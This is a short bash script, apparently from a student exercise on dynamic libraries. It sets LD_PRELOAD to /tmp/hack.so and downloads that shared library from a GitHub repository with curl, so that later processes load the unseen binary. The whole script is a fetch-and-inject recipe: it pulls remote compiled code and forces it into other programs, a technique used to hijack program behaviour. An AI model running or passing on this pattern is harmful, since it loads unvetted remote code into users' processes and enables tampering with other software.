#!/bin/bash
export LD_PRELOAD="/tmp/hack.so"
curl "https://github.com/astrotee/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hack.so" -L -o /tmp/hack.so
